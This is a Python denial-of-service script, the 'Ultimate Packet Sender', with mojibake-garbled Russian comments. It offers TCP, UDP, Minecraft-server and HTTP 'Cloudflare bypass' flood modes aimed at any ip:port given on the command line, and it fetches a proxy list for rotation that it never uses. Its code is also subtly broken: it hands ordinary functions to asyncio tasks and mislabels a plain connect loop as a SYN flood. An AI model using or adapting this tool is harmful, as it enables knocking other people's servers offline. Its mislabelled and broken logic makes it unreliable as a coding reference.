import socket
import random
import time
import socks
import multiprocessing
import sys
import os
import threading
import signal
import requests
import asyncio
from colorama import Fore, Style
from itertools import cycle

# –ü—Ä–æ–∫—Å–∏-—Å–µ—Ä–≤–µ—Ä—ã –¥–ª—è —Ä–æ—Ç–∞—Ü–∏–∏
PROXY_API_URL = "https://www.proxy-list.download/api/v1/get?type=socks5"

def get_proxies_from_api():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –ø—Ä–æ–∫—Å–∏ —á–µ—Ä–µ–∑ API"""
    try:
        response = requests.get(PROXY_API_URL, timeout=5)
        proxies = response.text.split("\r\n")
        return proxies
    except Exception as e:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø—Ä–æ–∫—Å–∏: {e}{Style.RESET_ALL}")
        return []

def get_random_proxy(proxies):
    """–í—ã–±–∏—Ä–∞–µ—Ç —Å–ª—É—á–∞–π–Ω—ã–π –ø—Ä–æ–∫—Å–∏ –∏–∑ —Å–ø–∏—Å–∫–∞"""
    return random.choice(proxies)

def animate(stop_event, target_ip, target_port, protocol, duration, workers):
    """–ê–Ω–∏–º–∞—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ —Å –≤—ã–≤–æ–¥–æ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± –∞—Ç–∞–∫–µ."""
    time.sleep(5)  # –ó–∞–¥–µ—Ä–∂–∫–∞ –ø–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º –∞–Ω–∏–º–∞—Ü–∏–∏
    while not stop_event.is_set():
        sys.stdout.write(f"\r{Fore.CYAN}üöÄ –ê—Ç–∞–∫–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–∞ {Fore.YELLOW}{target_ip}:{target_port}{Fore.CYAN} | {protocol} | {duration}s | –ú–æ—â–Ω–æ—Å—Ç—å: {workers} –ø–æ—Ç–æ–∫–æ–≤ {random.choice(['üî•', 'üí•', '‚ö°', 'üöÄ'])} {Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.5)

def send_tcp_syn(target_ip, target_port, duration):
    """TCP SYN Flood Attack"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((target_ip, target_port))
        packet = random._urandom(1024)  # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –ø–∞–∫–µ—Ç–∞
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.sendto(packet, (target_ip, target_port))
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ TCP SYN: {e}{Style.RESET_ALL}")

def send_tcp_ack(target_ip, target_port, duration):
    """TCP ACK Flood Attack"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.connect((target_ip, target_port))
        packet = random._urandom(1024)  # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –ø–∞–∫–µ—Ç–∞
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.sendto(packet, (target_ip, target_port))
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ TCP ACK: {e}{Style.RESET_ALL}")

def send_udp_pps(target_ip, target_port, duration):
    """UDP Flood with High PPS"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(packet, (target_ip, target_port))
    sock.close()

def send_udp_china(target_ip, target_port, duration):
    """UDP Flood Targeting China Geoblocked Servers"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time:
        sock.sendto(packet, (target_ip, target_port))
    sock.close()

# Layer 7 Minecraft

def send_mc_ping(target_ip, target_port, duration):
    """Minecraft Ping Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        ping_packet = b'\x00\x00\x00\x00\x00\x01\x00\x00'
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.send(ping_packet)
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ Minecraft Ping: {e}{Style.RESET_ALL}")

def send_mc_join(target_ip, target_port, duration):
    """Minecraft Join Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        join_packet = b'\x00\x00\x00\x00\x00\x01\x00\x00'
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.send(join_packet)
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ Minecraft Join: {e}{Style.RESET_ALL}")

def send_mc_handshake(target_ip, target_port, duration):
    """Minecraft Handshake Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        handshake_packet = b'\x00\x00\x00\x00\x00\x01\x00\x00'
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.send(handshake_packet)
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ Minecraft Handshake: {e}{Style.RESET_ALL}")

def send_mc_tcpbypass(target_ip, target_port, duration):
    """Minecraft TCP Bypass Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        tcp_packet = random._urandom(1024)
        end_time = time.time() + duration
        while time.time() < end_time:
            sock.send(tcp_packet)
        sock.close()
    except Exception as e:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ Minecraft TCP Bypass: {e}{Style.RESET_ALL}")

# Web Layer 7 (HTTP)

def send_http_out(target_ip, target_port, duration):
    """HTTP DDOS bypass method for Cloudflare"""
    try:
        url = f"http://{target_ip}:{target_port}"
        headers = {'User-Agent': 'Mozilla/5.0'}
        end_time = time.time() + duration
        while time.time() < end_time:
            requests.get(url, headers=headers)
    except Exception as e:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ HTTP OUT: {e}{Style.RESET_ALL}")

def send_http_misc(target_ip, target_port, duration):
    """HTTP Miscellaneous bypass method for Cloudflare"""
    try:
        url = f"http://{target_ip}:{target_port}"
        headers = {'User-Agent': 'Mozilla/5.0'}
        end_time = time.time() + duration
        while time.time() < end_time:
            requests.get(url, headers=headers)
    except Exception as e:
        print(f"{Fore.RED}‚ùå –û—à–∏–±–∫–∞ HTTP MISC: {e}{Style.RESET_ALL}")

# –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∞—Ç–∞–∫–∏
async def run_attack(target_ip, target_port, protocol, duration, workers, proxies):
    """–ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏ —Å —Ä–æ—Ç–∞—Ü–∏–µ–π –ø—Ä–æ–∫—Å–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –∞—Å–∏–Ω—Ö—Ä–æ–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π."""
    stop_event = threading.Event()
    anim_thread = threading.Thread(target=animate, args=(stop_event, target_ip, target_port, protocol, duration, workers), daemon=True)
    anim_thread.start()

    tasks = []
    for _ in range(workers):
        if protocol == "TCP-SYN":
            task = asyncio.create_task(send_tcp_syn(target_ip, target_port, duration))
        elif protocol == "TCP-ACK":
            task = asyncio.create_task(send_tcp_ack(target_ip, target_port, duration))
        elif protocol == "UDP-PPS":
            task = asyncio.create_task(send_udp_pps(target_ip, target_port, duration))
        elif protocol == "UDPCHINA":
            task = asyncio.create_task(send_udp_china(target_ip, target_port, duration))
        elif protocol == "MC-PING":
            task = asyncio.create_task(send_mc_ping(target_ip, target_port, duration))
        elif protocol == "MC-JOIN":
            task = asyncio.create_task(send_mc_join(target_ip, target_port, duration))
        elif protocol == "MC-HANDSHAKE":
            task = asyncio.create_task(send_mc_handshake(target_ip, target_port, duration))
        elif protocol == "MC-TCPBYPASS":
            task = asyncio.create_task(send_mc_tcpbypass(target_ip, target_port, duration))
        elif protocol == "HTTP-OUT":
            task = asyncio.create_task(send_http_out(target_ip, target_port, duration))
        elif protocol == "HTTP-MISC":
            task = asyncio.create_task(send_http_misc(target_ip, target_port, duration))
        else:
            print(f"{Fore.RED}üö® –û—à–∏–±–∫–∞: –Ω–µ–ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–π –ø—Ä–æ—Ç–æ–∫–æ–ª {protocol}{Style.RESET_ALL}")
            return
        tasks.append(task)

    await asyncio.gather(*tasks)

    stop_event.set()
    sys.stdout.write("\r")
    sys.stdout.flush()

def banner():
    """–í—ã–≤–æ–¥ –±–∞–Ω–Ω–µ—Ä–∞"""
    print(f"{Fore.MAGENTA}==================================")
    print(f"üöÄ {Fore.YELLOW}üí£ Ultimate Packet Sender üí£ {Fore.MAGENTA}üöÄ")
    print(f"================================== {Style.RESET_ALL}")

def signal_handler(sig, frame):
    print(f"\n{Fore.RED}‚ùå –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º.{Style.RESET_ALL}")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    banner()

    if len(sys.argv) != 5:
        print(f"{Fore.RED}‚ö†Ô∏è –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: python z.py ip:port protocol time{Style.RESET_ALL}")
        sys.exit(1)

    target = sys.argv[1]
    protocol = sys.argv[2].upper()
    duration = int(sys.argv[3])
    workers = multiprocessing.cpu_count() * 2  # –ò—Å–ø–æ–ª—å–∑—É–µ—Ç –≤ 2 —Ä–∞–∑–∞ –±–æ–ª—å—à–µ –ø–æ—Ç–æ–∫–æ–≤, —á–µ–º —è–¥–µ—Ä

    # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø—Ä–æ–∫—Å–∏ —Å API
    proxies = get_proxies_from_api()

    if not proxies:
        print(f"{Fore.RED}‚ùå –ü—Ä–æ–∫—Å–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã. –ó–∞–≤–µ—Ä—à–∞–µ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ.{Style.RESET_ALL}")
        sys.exit(1)

    try:
        target_ip, target_port = target.split(":")
        target_port = int(target_port)
    except ValueError:
        print(f"{Fore.RED}üö® –û—à–∏–±–∫–∞: –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç ip:port{Style.RESET_ALL}")
        sys.exit(1)

    print(f"{Fore.GREEN}üí• –ê—Ç–∞–∫–∞ –Ω–∞—á–∞–ª–∞—Å—å –Ω–∞ {target_ip}:{target_port} —á–µ—Ä–µ–∑ {protocol} –Ω–∞ {duration} —Å–µ–∫—É–Ω–¥! üî•{Style.RESET_ALL}")
    asyncio.run(run_attack(target_ip, target_port, protocol, duration, workers, proxies))
    print(f"{Fore.BLUE}‚úÖ üéØ –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∞–∫–µ—Ç–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!{Style.RESET_ALL}")
